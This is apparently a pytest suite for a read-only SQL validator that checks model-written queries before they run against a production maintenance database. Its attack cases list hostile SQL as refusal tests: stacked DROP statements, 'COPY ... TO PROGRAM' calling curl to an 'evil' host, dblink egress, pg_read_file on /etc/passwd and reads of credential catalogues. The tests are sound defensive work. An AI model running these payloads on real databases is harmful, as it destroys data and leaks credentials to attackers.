"""
Read-only SQL validation.

A model writes these queries and a scheduler runs them unattended against a
production system, so the query text is untrusted input. Tests are written
as attacks first, legitimate queries second — a validator that blocks
everything is useless, and one that blocks nothing is dangerous.
"""

from __future__ import annotations

import pytest

from elp.config import ReportSettings
from elp.reports.sqlguard import (
    UnsafeQuery,
    check_read_only,
    enforce_limit,
    extract_tables,
    redact_columns,
    validate,
)


@pytest.fixture
def settings():
    return ReportSettings(
        allowed_tables=["work_orders", "aircraft", "defects"],
        allowed_schemas=["namis"],
        max_rows=5000,
    )


@pytest.fixture
def open_settings():
    """The default: no allowlist configured."""
    return ReportSettings()


# ----------------------------------------------------------------------
# Attacks
# ----------------------------------------------------------------------

@pytest.mark.parametrize(
    "name,sql",
    [
        ("stacked statement", "SELECT 1; DROP TABLE work_orders"),
        ("stacked via comment", "SELECT * FROM work_orders /* x */; UPDATE aircraft SET a=1"),
        ("keyword after line comment", "SELECT * FROM work_orders --\nDELETE FROM work_orders"),
        ("plain delete", "DELETE FROM work_orders WHERE 1=1"),
        ("plain update", "UPDATE aircraft SET status = 'X'"),
        ("insert", "INSERT INTO aircraft (id) VALUES (1)"),
        ("drop", "DROP TABLE aircraft"),
        ("truncate", "TRUNCATE work_orders"),
        ("grant", "GRANT ALL ON work_orders TO PUBLIC"),
        ("set role", "SET ROLE postgres"),
        ("copy to program", "COPY work_orders TO PROGRAM 'curl http://evil'"),
        ("select into", "SELECT * INTO exfil FROM work_orders"),
        ("cte then insert", "WITH x AS (SELECT 1) INSERT INTO aircraft SELECT * FROM x"),
        ("file read", "SELECT pg_read_file('/etc/passwd')"),
        ("file list", "SELECT pg_ls_dir('/')"),
        ("sleep dos", "SELECT pg_sleep(9999) FROM aircraft"),
        ("dblink egress", "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)"),
        ("large object export", "SELECT lo_export(1, '/tmp/x')"),
        ("empty", "   "),
        ("comment only", "-- just a comment"),
    ],
)
def test_dangerous_statements_are_refused(name, sql, open_settings):
    """Every one of these must be refused with the default (empty) allowlist."""
    with pytest.raises(UnsafeQuery):
        validate(sql, open_settings)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_catalog.pg_shadow",
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM pg_user",
        "SELECT * FROM pg_authid",
    ],
)
def test_system_catalogues_are_refused(sql, open_settings):
    """No operational report needs the system catalogue, and it leaks structure."""
    with pytest.raises(UnsafeQuery):
        validate(sql, open_settings)


def test_tables_outside_the_allowlist_are_refused(settings):
    with pytest.raises(UnsafeQuery, match="not in the reporting allowlist"):
        validate("SELECT * FROM payroll", settings)


def test_the_rejection_says_how_to_fix_it(settings):
    """The person who asked for the report reads this message."""
    with pytest.raises(UnsafeQuery) as caught:
        validate("SELECT * FROM payroll", settings)
    assert "ELP_REPORTS__ALLOWED_TABLES" in str(caught.value)


# ----------------------------------------------------------------------
# Legitimate queries
# ----------------------------------------------------------------------

@pytest.mark.parametrize(
    "sql",
    [
        "SELECT tail_number FROM aircraft WHERE status = 'AOG'",
        "SELECT a.tail_number, w.wo_number FROM aircraft a JOIN work_orders w ON w.aircraft_id = a.id",
        "WITH open_wo AS (SELECT * FROM work_orders WHERE closed_at IS NULL) SELECT count(*) FROM open_wo",
        "SELECT ata_chapter, count(*) FROM defects GROUP BY ata_chapter ORDER BY 2 DESC",
        "SELECT * FROM namis.defects WHERE opened_at > CURRENT_DATE - INTERVAL '30 days'",
    ],
)
def test_legitimate_queries_pass(sql, settings):
    result = validate(sql, settings)
    assert result.sql


def test_a_keyword_inside_a_string_literal_is_not_a_keyword(settings):
    """
    `WHERE status = 'deleted'` is a perfectly ordinary filter.

    Scanning raw text for keywords would reject it, which is the classic way
    a naive validator becomes unusable.
    """
    result = validate(
        "SELECT * FROM work_orders WHERE status = 'deleted'", settings
    )
    assert "work_orders" in result.tables


def test_a_column_named_like_a_keyword_is_fine(settings):
    validate("SELECT wo_number FROM work_orders WHERE notes = 'insert into log'", settings)


def test_cte_names_are_not_treated_as_tables(settings):
    """A WITH alias is not a physical table and must not fail the allowlist."""
    result = validate(
        "WITH recent AS (SELECT * FROM work_orders) SELECT * FROM recent", settings
    )
    assert "recent" not in result.tables
    assert "work_orders" in result.tables


# ----------------------------------------------------------------------
# Limits and redaction
# ----------------------------------------------------------------------

def test_a_missing_limit_is_added(settings):
    result = validate("SELECT * FROM work_orders", settings)
    assert result.limit_applied == 5000
    assert "LIMIT 5000" in result.sql
    assert result.notes


def test_an_existing_limit_is_respected(settings):
    result = validate("SELECT * FROM work_orders LIMIT 10", settings)
    assert result.limit_applied is None
    assert result.sql.count("LIMIT") == 1


def test_fetch_first_counts_as_a_limit():
    _sql, applied = enforce_limit("SELECT * FROM t FETCH FIRST 10 ROWS ONLY", 5000)
    assert applied is None


def test_sensitive_columns_are_identified():
    columns = ["tail_number", "technician_password", "SSN", "notes", "api_token"]
    redacted = redact_columns(columns, ReportSettings())
    assert redacted == {1, 2, 4}


def test_redaction_list_is_configurable():
    settings = ReportSettings(redacted_columns=["salary"])
    assert redact_columns(["name", "salary_band"], settings) == {1}


# ----------------------------------------------------------------------
# Parsing helpers
# ----------------------------------------------------------------------

def test_table_extraction_handles_schema_qualification():
    tables = extract_tables("select * from namis.work_orders w join aircraft a on a.id = w.id")
    assert "namis.work_orders" in tables
    assert "aircraft" in tables


def test_check_read_only_returns_the_masked_body():
    body = check_read_only("SELECT 1 -- trailing comment")
    assert body.strip().startswith("SELECT 1")
